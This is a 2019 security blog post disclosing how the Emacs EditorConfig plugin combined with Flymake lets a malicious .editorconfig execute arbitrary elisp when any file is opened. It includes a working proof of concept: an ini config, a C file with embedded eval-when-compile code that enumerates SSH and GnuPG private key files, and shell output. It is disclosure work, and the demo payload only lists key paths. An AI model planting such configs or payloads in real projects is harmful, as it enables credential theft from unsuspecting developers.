---
date: 2019-10-06
---

Emacs + EditorConfig + Flymake = code execution
================================================

There has been a lot of talk on Emacs security for some time now.  A lot
of the discussion has been about transport security for package
repositories.  Unfortunately, transport security isn't the only issue
with Emacs.

I tend to audit most Emacs packages that I use, and one common issue is
that a lot of packages executes shell commands with potentially
[untrusted][1] data as input.

Recently, I read the [EditorConfig][2] plugin for Emacs and noticed
something interesting.  It allows major modes to be set by name and by
extension with the `file_type_emacs` and `file_type_ext` settings.

In `editorconfig-apply`, the function
`editorconfig-set-major-mode-from-name` is invoked with the value of
`file_type_emacs`.  This function concatenates the file type with the
string `-mode` and calls it as a function if it's bound:

```elisp
(defun editorconfig-set-major-mode-from-name (filetype)
  "Set buffer `major-mode' by FILETYPE.

FILETYPE should be s string like `\"ini\"`, if not nil or empty string."
  (let ((mode (and filetype
                   (not (string= filetype
                                 ""))
                   (intern (concat filetype
                                   "-mode")))))
    (when mode
      (if (fboundp mode)
          (editorconfig-apply-major-mode-safely mode)
        (display-warning :error (format "Major-mode `%S' not found"
                                        mode))
        nil))))
```

(The word *safely* in `editorconfig-apply-major-mode-safely` has nothing
to do with security; this function merely avoids infinite recursion when
changing major mode.)

Similarly, `editorconfig-apply` invokes
`editorconfig-set-major-mode-from-ext` with the value of
`file_type_ext`.  A lookup for `file_type_ext` is made in
`auto-mode-alist` with the function `editorconfig--find-mode-from-ext`
and the matching mode function (if any) is executed:

```elisp
(defun editorconfig--find-mode-from-ext (ext &optional filename)
  "Get suitable `major-mode' from EXT and FILENAME.
If FILENAME is omitted filename of current buffer is used."
  (cl-assert ext)
  (cl-assert (not (string= ext "")))
  (let* ((name (concat (or filename
                           buffer-file-name)
                       "."
                       ext)))
    (assoc-default name
                   auto-mode-alist
                   'string-match)))
```

Why is this interesting?  Well, because a malicious `.editorconfig` file
could use these features to change any opened file in a project to an
arbitrary mode **and** execute any bound function that ends in `-mode`.
And this brings us to another unfortunate fact of Emacs.

Emacs ships with a built-in syntax checker called Flymake (and yes, the
popular alternative that goes by the name of Flycheck suffers from the
exact same problem!).  Flymake allows major modes to define backend
functions that executes syntax checkers, linters, formatters and other
tools on various buffer events.

There aren't that many Flymake backends in a default installation of
Emacs.  One of the few backends that *does* ship with Emacs is for
`elisp` code, and it is named `elisp-flymake-byte-compile`.

What `elisp-flymake-byte-compile` does is start an asynchronous Emacs
process where the current buffer is byte-compiled.  And, in the world of
`elisp`, all that's needed to execute code during byte-compilation is
the macro `eval-when-compile`.

This functionality can be coupled with the peculiar features of the
EditorConfig plugin to achieve arbitrary code execution.  In order to do
so, we would first change the major mode to `elisp` with
`file_type_ext`.  After doing that, we enable Flymake mode (and thus
byte compilation) with `file_type_emacs`.  For example:

```ini
[*]
file_type_ext = el
file_type_emacs = flymake
```

At this point, any buffer opened in a project with the `.editorconfig`
above could execute `elisp`.  For example:

```c
/*
(eval-when-compile
  (with-temp-file "~/bye-bye-keys"
    (dolist (x (append (directory-files "~/.gnupg/private-keys-v1.d/" t "^[^.]")
                       (directory-files "~/.ssh/" t "id_")))
      ;; <insert evil POST request to some shady API>
      (insert (format "could have shared %s with the world!\n" x)))))
*/

#include <stdio.h>

int main(void)
{
    printf("ohai\n");
}
```

`/*` and `*/` causes non-erroneous warnings in the `elisp` byte
compiler.  The non-elisp code does, however, break the byte compiler;
but our elisp has already been executed at that point.  The end result
is that we have code that is both valid-enough `elisp` and valid `C`.

```sh
~/poc$ cat ~/bye-bye-keys
cat: /home/hji/bye-bye-keys: No such file or directory
~/poc$ emacs foo.c
~/poc$ cat ~/bye-bye-keys
could have shared /home/hji/.gnupg/private-keys-v1.d/9598156881A8DFAE885F503AC61D6FD95A3A971A.key with the world!
could have shared /home/hji/.ssh/id_rsa with the world!
could have shared /home/hji/.ssh/id_rsa.pub with the world!
~/poc$
```


[1]: https://github.com/abo-abo/swiper/issues/1905
[2]: https://github.com/editorconfig/editorconfig-emacs
